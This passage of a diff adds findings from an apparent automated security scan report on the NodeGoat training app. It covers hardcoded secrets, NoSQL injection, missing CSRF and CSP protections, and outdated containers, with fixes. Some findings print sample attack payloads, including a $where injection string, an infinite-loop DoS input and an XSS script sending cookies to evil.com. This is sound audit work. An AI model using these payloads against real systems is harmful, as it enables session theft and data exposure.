+            "text": "Hardcoded credentials found in db-reset.js: admin/Admin_123, user1/User1_123, user2/User2_123. These are inserted into the users collection as seed data and are permanently visible in source control history."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "artifacts/db-reset.js"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "e00df0ccbf7ad1be3f308d934e6cc0d19e59f3d092eaea2e67b885284232ffe8"
+          },
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "VULN-013-004",
+          "ruleIndex": 46,
+          "level": "warning",
+          "message": {
+            "text": "The project uses bcrypt-nodejs version 0.0.3 which is deprecated and has known vulnerabilities. Although the bcrypt usage is currently commented out in user-dao.js, the dependency remains and could be re-enabled without upgrading to a secure alternative (e.g., bcrypt or argon2)."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/data/user-dao.js"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "acf20384da0cd51140b4284b347346b48aee43b8548319eeee68f1e2c2282635"
+          },
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "VULN-013-005",
+          "ruleIndex": 47,
+          "level": "error",
+          "message": {
+            "text": "Plaintext credentials are embedded in the db-reset.js seed script and committed to source control. These credentials (admin/Admin_123, user1/User1_123, user2/User2_123) are accessible to anyone with repository read access and persist in git history even if removed from the current branch."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "artifacts/db-reset.js"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "24cf9172f06ef9e06b71af3715c09fe2cae6b3b823627bb2ecefb24afe717e60"
+          },
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "NOSQL-INJECTION-WHERE",
+          "ruleIndex": 48,
+          "level": "error",
+          "message": {
+            "text": "The getByUserIdAndThreshold function builds a MongoDB $where clause via string interpolation: `$where: \\`this.userId == ${parsedUserId} && this.stocks > '${threshold}'\\``. The threshold parameter originates from req.query.threshold with no sanitization, enabling NoSQL injection. An attacker can inject `1'; return 1 == '1` to bypass the filter and retrieve all allocation records."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/data/allocations-dao.js"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "8ea8dbb3e454e7cf774238b65a1e065a26d3e4598cc9dc9fbc1613ee208e7e2b"
+          },
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "JS-INJECTION-MONGODB",
+          "ruleIndex": 49,
+          "level": "error",
+          "message": {
+            "text": "The $where operator in getByUserIdAndThreshold executes a JavaScript expression on the MongoDB server. Because the threshold value is interpolated directly into this expression without escaping, an attacker gains server-side JavaScript execution within the MongoDB process. This allows reading data from arbitrary collections, manipulating results, or executing privileged database operations."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/data/allocations-dao.js"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "f8632e8561b4bf1b5aae970d579f8eb62208410ebdcd38d859761dde0f37c664"
+          },
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "DOS-VIA-INJECTION",
+          "ruleIndex": 50,
+          "level": "error",
+          "message": {
+            "text": "An attacker can cause denial of service by injecting `0';while(true){}'` as the threshold parameter. This creates an infinite loop in the MongoDB $where JavaScript evaluation, blocking the database thread. No input validation or query timeout is configured to prevent this attack."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/data/allocations-dao.js"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "1f0d11cd9a8214c5fb83f1c2751fac57a31fbb462ccea874487d30ddfe7f82f4"
+          },
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "UPSERT-DATA-INTEGRITY",
+          "ruleIndex": 51,
+          "level": "warning",
+          "message": {
+            "text": "The update method uses {upsert: true}, which will create a new allocation document if no match is found. Combined with the lack of input validation on query parameters, an attacker could create fabricated financial allocation records, compromising data integrity in the allocations collection."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/data/allocations-dao.js"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "0d9c454ec04cbc4d94adc0aebe8ca9bee60c840db9bb096563f04dcfbd6e5785"
+          },
+          "properties": {
+            "confidence": 0.75
+          }
+        },
+        {
+          "ruleId": "SESSION-001",
+          "ruleIndex": 52,
+          "level": "error",
+          "message": {
+            "text": "Session secret is hardcoded as 'session_cookie_secret_key_here'. An attacker with source access can forge arbitrary session cookies and impersonate any user."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "config/config.js"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "257410ffbd1ebb97fb1fdaffee44631e74a6e319934001eaea5f71c487f797db"
+          },
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "SESSION-002",
+          "ruleIndex": 53,
+          "level": "error",
+          "message": {
+            "text": "Session cookie does not set secure flag. Cookies are transmitted over HTTP in cleartext, allowing interception by network attackers."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "server.js"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "2fedd66205bf024b942e98b2b230ed41bf4b9a4ec1502214ad7e8c2f1a09f972"
+          },
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "SESSION-003",
+          "ruleIndex": 54,
+          "level": "error",
+          "message": {
+            "text": "No session regeneration (req.session.regenerate) on login. Allows session fixation: attacker pre-sets session ID, victim authenticates, attacker hijacks the now-authenticated session."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "server.js"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "292cc6be9b92bcfd54508595bfc4538061f8c6c2b7504e06d25787c37f2564e4"
+          },
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "SESSION-004",
+          "ruleIndex": 55,
+          "level": "error",
+          "message": {
+            "text": "CSRF protection middleware (csurf) is commented out. All state-changing endpoints are vulnerable to cross-site request forgery."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "server.js"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "0637b63e5734cc841e331f41ae3f8de320f61621fda8d53c2264c4ba275719a2"
+          },
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "SESSION-005",
+          "ruleIndex": 56,
+          "level": "error",
+          "message": {
+            "text": "Application served over plain HTTP. All traffic including session tokens and credentials is transmitted in cleartext, vulnerable to man-in-the-middle attacks."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "server.js"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "5a44473081819da04d1f043549f4eb79b08630cacb2f1b47e857d1073c904ec2"
+          },
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "SESSION-006",
+          "ruleIndex": 57,
+          "level": "error",
+          "message": {
+            "text": "Cryptographic key is hardcoded as 'a_secure_key_for_crypto_here'. Attacker with source access can decrypt all protected data."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "config/config.js"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "1f3ef1ab3a3f979c3be04c75d3f4a5232f7787a7a144442ac43f40ad8ec8c947"
+          },
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "SESSION-007",
+          "ruleIndex": 58,
+          "level": "warning",
+          "message": {
+            "text": "saveUninitialized is true, creating sessions for all visitors. Enables session fixation pre-conditions and wastes resources."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "server.js"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "e9ab6deef1bcda54f2fb8e70a2b03d81795c50f3d5d6ed12d5dfbb2899396ed6"
+          },
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "SESSION-008",
+          "ruleIndex": 59,
+          "level": "warning",
+          "message": {
+            "text": "Session cookie has no maxAge. Sessions may persist indefinitely through browser session restore, expanding the hijack window."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "server.js"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "21ec4b29f1b622bb5635abf1060fd6b34afe0cd989f9ec24bd2e9dea115a28f4"
+          },
+          "properties": {
+            "confidence": 0.75
+          }
+        },
+        {
+          "ruleId": "MISSING-SECURITY-HEADERS",
+          "ruleIndex": 60,
+          "level": "error",
+          "message": {
+            "text": "Helmet middleware is imported but commented out: '// app.use(helmet())'. This disables all standard security headers including X-Content-Type-Options (nosniff), X-Frame-Options, Strict-Transport-Security, and X-XSS-Protection. The dont-sniff-mimetype middleware is also commented out, and app.disable('x-powered-by') is not called, leaking the Express framework identity. Fix: uncomment app.use(helmet()) and ensure it is placed early in the middleware chain."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "server.js"
+                },
+                "region": {
+                  "startLine": 1,
+                  "endLine": 50
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "a603c74dd342f2c4925697b9be8618bf05fd3231619680621a4bec5ed0251bff"
+          },
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "MISSING-CSRF-PROTECTION",
+          "ruleIndex": 61,
+          "level": "error",
+          "message": {
+            "text": "CSRF protection middleware (csurf) is imported but commented out. All POST/PUT/DELETE endpoints accept requests without CSRF token validation. An attacker can create a malicious page with auto-submitting forms targeting authenticated endpoints (e.g., fund transfers, password changes, profile updates). Fix: uncomment app.use(csrf()) and ensure CSRF tokens are embedded in all forms and validated on state-changing requests."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "server.js"
+                },
+                "region": {
+                  "startLine": 1,
+                  "endLine": 50
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "3db7c9e840d87ed939f3014a695c5c924cb8567945f582b46adc2b59a7875774"
+          },
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "TEMPLATE-AUTOESCAPE-DISABLED",
+          "ruleIndex": 62,
+          "level": "error",
+          "message": {
+            "text": "Swig template engine is configured with autoescape: false, globally disabling HTML output encoding. Any user-controlled data rendered in templates will be injected as raw HTML, creating stored and reflected XSS vulnerabilities across all views. This is the root cause enabling XSS in every template that renders user input. Fix: set autoescape: true in swig configuration and audit templates for any places that intentionally render raw HTML using the |safe filter."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "server.js"
+                },
+                "region": {
+                  "startLine": 1,
+                  "endLine": 50
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "4b9e8fa409ad6ef403e97e0656167d03002a1089015c1928c75cf4db5141e384"
+          },
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "NO-HTTPS-TRANSPORT",
+          "ruleIndex": 63,
+          "level": "error",
+          "message": {
+            "text": "Application uses http.createServer() without TLS. All traffic including session cookies, login credentials, and sensitive data travels in cleartext. Session cookies lack the Secure flag (which requires HTTPS), making them interceptable on any network hop. Fix: use https.createServer() with valid TLS certificates, or deploy behind a TLS-terminating reverse proxy and set the 'trust proxy' setting, and mark session cookies as Secure."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "server.js"
+                },
+                "region": {
+                  "startLine": 1,
+                  "endLine": 50
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "b463af429acc4326fb917ca9f25438963eda03e7ca5048933035759e0503373c"
+          },
+          "properties": {
+            "confidence": 0.9
+          }
+        },
+        {
+          "ruleId": "MISSING-CLICKJACKING-PROTECTION",
+          "ruleIndex": 64,
+          "level": "error",
+          "message": {
+            "text": "No X-Frame-Options header or CSP frame-ancestors directive is set because helmet is commented out. The application can be framed by any origin, enabling clickjacking attacks. An attacker can overlay transparent iframes of the application over decoy UI to trick users into performing unintended actions. Fix: enable helmet (which sets X-Frame-Options: SAMEORIGIN by default) or manually set the header and add a CSP frame-ancestors directive."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "server.js"
+                },
+                "region": {
+                  "startLine": 1,
+                  "endLine": 50
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "b7a27026a2855a77d10c3856d7bfac99027fd889bda2fd13e106f67f941c61e8"
+          },
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "MISSING-CSP",
+          "ruleIndex": 65,
+          "level": "error",
+          "message": {
+            "text": "No Content-Security-Policy header is configured. Without CSP, there is no browser-enforced restriction on script sources, inline script execution, or eval(). Combined with Swig autoescape: false, the application has zero XSS mitigations at any layer. Fix: configure a strict CSP with script-src 'self', disallow unsafe-inline and unsafe-eval, and add nonce-based or hash-based script allowlisting."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "server.js"
+                },
+                "region": {
+                  "startLine": 1,
+                  "endLine": 50
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "c07a8156dd682c9c8d3736b062300f89c03fe866c14b561ff4a89c4d1f008689"
+          },
+          "properties": {
+            "confidence": 0.9
+          }
+        },
+        {
+          "ruleId": "STATIC-AFTER-SESSION",
+          "ruleIndex": 66,
+          "level": "warning",
+          "message": {
+            "text": "express.static() middleware is registered after the session middleware in the middleware chain. Every request for CSS, JavaScript, images, and other static files triggers session store lookups and session cookie processing unnecessarily. This wastes resources and can leak session cookies on cacheable public assets. Fix: move express.static() before session middleware, or serve static assets from a CDN/separate origin."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "server.js"
+                },
+                "region": {
+                  "startLine": 1,
+                  "endLine": 50
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "8263d8f36f0890029ecda1ebc3ab14d5cd577c57c5bebebc668dc79782a829dd"
+          },
+          "properties": {
+            "confidence": 0.85
+          }
+        },
+        {
+          "ruleId": "VULN-017-001",
+          "ruleIndex": 67,
+          "level": "error",
+          "message": {
+            "text": "Hardcoded session secret 'session_cookie_secret_key_here' allows session forgery and hijacking. Replace with process.env.SESSION_SECRET."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "config/env/all.js"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "ed6a88dc87357b32e51db4bf19c7783369b74966ad9bf4e52524b985e4439d9c"
+          },
+          "properties": {
+            "confidence": 0.99
+          }
+        },
+        {
+          "ruleId": "VULN-017-002",
+          "ruleIndex": 68,
+          "level": "error",
+          "message": {
+            "text": "Hardcoded cryptographic key 'a_secure_key_for_crypto_here' compromises all encrypted data. Replace with process.env.CRYPTO_KEY or a KMS-managed key."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "config/env/all.js"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "88678fa725ae2d795f804e8c475e3b799c78de70ebf21980253764b85be7e052"
+          },
+          "properties": {
+            "confidence": 0.99
+          }
+        },
+        {
+          "ruleId": "VULN-017-003",
+          "ruleIndex": 69,
+          "level": "error",
+          "message": {
+            "text": "console.log(util.inspect(config)) dumps secrets (cookieSecret, cryptoKey, db credentials) to stdout. Remove this logging or redact sensitive fields."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "config/config.js"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "7b947ba58e68957ac01992f1c4758d326407f5471c1f0854438886f63dfb8157"
+          },
+          "properties": {
+            "confidence": 0.99
+          }
+        },
+        {
+          "ruleId": "VULN-017-004",
+          "ruleIndex": 70,
+          "level": "error",
+          "message": {
+            "text": "MongoDB connection 'mongodb://localhost:27017/nodegoat' has no authentication. Enable MongoDB auth and use credentials from environment variables."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "config/env/all.js"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "74e1e990d899f34388f440bb38b974c397a45623da1256d66548bd680049d78a"
+          },
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "VULN-017-005",
+          "ruleIndex": 71,
+          "level": "warning",
+          "message": {
+            "text": "Dynamic require using NODE_ENV without path traversal sanitization. Validate NODE_ENV against an allowlist of known environments before constructing the path."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "config/config.js"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "3a47eb1589e51e6f601f11c776acb687c55edd24cda1ad4d4a84e2bacca66c01"
+          },
+          "properties": {
+            "confidence": 0.75
+          }
+        },
+        {
+          "ruleId": "VULN-017-006",
+          "ruleIndex": 72,
+          "level": "error",
+          "message": {
+            "text": "production.js is empty, so production inherits hardcoded secrets from all.js. Production must override cookieSecret, cryptoKey, and db with secure, externalized values."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "config/env/production.js"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "8477f7b0d619c5c988f10a9a371790d811ee171ca83ae0caf08a78d9dd7fe692"
+          },
+          "properties": {
+            "confidence": 0.99
+          }
+        },
+        {
+          "ruleId": "VULN-017-007",
+          "ruleIndex": 73,
+          "level": "warning",
+          "message": {
+            "text": "ZAP API key hardcoded in development.js. Use environment variables for all API keys to prevent accidental exposure in version control."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "config/env/development.js"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "122704e7ccda4455b46702024c1f8390abb0f42f5fe235eb488e895ebfe54117"
+          },
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "VULN-017-008",
+          "ruleIndex": 74,
+          "level": "warning",
+          "message": {
+            "text": "document.write used to inject livereload script in development config. Use DOM API (createElement/appendChild) instead to avoid XSS sink."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "config/env/development.js"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "c65554698b5254c3212029538a5080a236c335bf7855ea7e6395f2898c905987"
+          },
+          "properties": {
+            "confidence": 0.75
+          }
+        },
+        {
+          "ruleId": "OPEN-REDIRECT",
+          "ruleIndex": 75,
+          "level": "error",
+          "message": {
+            "text": "The /learn endpoint performs res.redirect(req.query.url) with no validation. An attacker can supply an arbitrary URL (e.g., /learn?url=https://evil.com/phish) to redirect users to a malicious site. This enables phishing attacks that leverage the trusted origin domain. Remediation: validate req.query.url against an allowlist of permitted domains, or restrict redirects to relative paths only."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "server.js"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "bf05ee51bc3d28382b66e7680a5f5cf2f83847009e7f4791ce2709a59495f47e"
+          },
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "MISSING-CSP-HEADER",
+          "ruleIndex": 76,
+          "level": "warning",
+          "message": {
+            "text": "The application does not set a Content-Security-Policy header. Static JavaScript files from app/assets/js/ are served without script-src restrictions, allowing any injected script to execute. Remediation: add helmet.contentSecurityPolicy() middleware or manually set the Content-Security-Policy header with a restrictive script-src directive (e.g., script-src 'self')."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "server.js"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "f7de4d7de270ae40a55c522ea25b2d3c136d6737f588db8d2d3e2951290d1555"
+          },
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "SESSION-ON-STATIC-ASSETS",
+          "ruleIndex": 77,
+          "level": "note",
+          "message": {
+            "text": "express.static(__dirname + '/app/assets') is mounted after session middleware. Every static asset request (JS, CSS, images) unnecessarily creates or validates a session, wasting server resources and enlarging the session store. Remediation: move the express.static middleware before session middleware, or use a path prefix excluded from session handling."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "server.js"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "58f0031f1e6a65596d0359f957e905af0b2ec6211eef63bccd5754a4df4a3ba6"
+          },
+          "properties": {
+            "confidence": 0.75
+          }
+        },
+        {
+          "ruleId": "DOM-XSS-CLIENT-JS",
+          "ruleIndex": 78,
+          "level": "warning",
+          "message": {
+            "text": "Client-side JavaScript files in app/assets/js/ (chart/, tour/) may use DOM sinks such as innerHTML, document.write, or jQuery .html() with unsanitized data from URL parameters or DOM sources. Combined with the absence of Content-Security-Policy headers, DOM-based XSS attacks can execute arbitrary scripts. Remediation: audit client-side JS for DOM sink usage, sanitize all DOM-sourced data, and deploy CSP headers."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/assets/js/"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "829d0c44a635f9de3016611dadfd70b03352e36e4500118f08c7888b82c1119f"
+          },
+          "properties": {
+            "confidence": 0.75
+          }
+        },
+        {
+          "ruleId": "XSS-AUTOESCAPE-DISABLED",
+          "ruleIndex": 79,
+          "level": "error",
+          "message": {
+            "text": "swig.setDefaults({ autoescape: false }) disables HTML escaping globally. All template variables are rendered as raw HTML, making every dynamic output an XSS vector. This is the root cause enabling all template-based XSS in the application."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "server.js"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "79b13813a88c420c71af8a6d6a43e702604cacf7eecf6d32ad039035578ca8ff"
+          },
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "XSS-PROFILE-FIELDS",
+          "ruleIndex": 80,
+          "level": "error",
+          "message": {
+            "text": "User profile fields (firstName, lastName, website) from the database are rendered in view templates without escaping. An attacker stores malicious JavaScript in profile fields that executes when any user views the profile page, achieving stored XSS."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/views/profile.html"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "9824118212ff3bbc88bbfc990da7d5055091b0bbd1ca6af5936e948a8476bfe8"
+          },
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "XSS-MEMO-CONTENT",
+          "ruleIndex": 81,
+          "level": "error",
+          "message": {
+            "text": "Memo content submitted by users is rendered in templates without HTML escaping. An attacker submits a memo containing a script payload (e.g., <script>document.location='http://evil.com/?c='+document.cookie</script>) that executes when the memo is displayed."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/views/memos.html"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "c2fb2eed0e898921766a57b10832d387ae0fb9682db5f859320268af8c34dfc3"
+          },
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "UNMAINTAINED-DEPENDENCY",
+          "ruleIndex": 82,
+          "level": "warning",
+          "message": {
+            "text": "Swig 1.4.2 has been deprecated and unmaintained since 2016. Known XSS bypass vulnerabilities exist and will never receive patches. The project should migrate to a maintained template engine (e.g., Nunjucks, EJS with auto-escaping, Handlebars)."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package.json"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "70b31a0b69052fe2ee28ca3209d702af69553c39acfeede65d1ef5d9a3a9e840"
+          },
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "IAC-001",
+          "ruleIndex": 83,
+          "level": "error",
+          "message": {
+            "text": "Dockerfile uses FROM node:12-alpine. Node.js 12 is end-of-life since 2022-04-30 and receives no security patches. Upgrade to a current LTS release (e.g., node:20-alpine)."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "Dockerfile"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "e9356e01352d146d9fb51b2bd485e02f540e3bbeb801468eeb60544d9c48669a"
+          },
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "IAC-002",
+          "ruleIndex": 84,
+          "level": "error",
+          "message": {
+            "text": "MongoDB is exposed on port 27017 via docker-compose.yml without any authentication. MONGODB_URI=mongodb://mongo/nodegoat contains no credentials. Any network-reachable actor can read, modify, or drop all data."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "docker-compose.yml"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "1d31fe8673eb7da3ac06898d0f1780f57b4563389f7ef54d4e380458eaffb57e"
+          },
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "IAC-003",
+          "ruleIndex": 85,
+          "level": "warning",
+          "message": {
+            "text": "Permission hardening commands in Dockerfile are commented out. The container filesystem is not locked down, allowing a compromised process broader read/write access than necessary."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "Dockerfile"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "7d0151364a152a491623fce36cf99905388a7eea898b6f2f6d3485ea0a8df15d"
+          },
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "IAC-004",
+          "ruleIndex": 86,
+          "level": "error",
+          "message": {
+            "text": "docker-compose.yml uses mongo:4.4 which is end-of-life (February 2024). No security patches are issued. Upgrade to MongoDB 7.0+ for active support and security updates."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "docker-compose.yml"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "cca5b5274d848a05b11ce509556b5844d1a0499b0b2a82dcd74cfcdaecbfd115"
+          },
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "IAC-005",
+          "ruleIndex": 87,
+          "level": "warning",
+          "message": {
+            "text": "No CPU or memory resource limits are set on web or mongo services. A DoS attack or resource-exhausting exploit can consume all host resources."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "docker-compose.yml"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "268c472b274dd5ae71055166788210329a6dd1fca945aeaa0774f0048ab81367"
+          },
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "IAC-006",
+          "ruleIndex": 88,
+          "level": "error",
+          "message": {
+            "text": "app.json describes MONGODB_URI as 'Must be publicly accessible'. Combined with no authentication (IAC-002), this creates an internet-facing unauthenticated MongoDB instance discoverable by automated scanners."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app.json"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "fingerprints": {
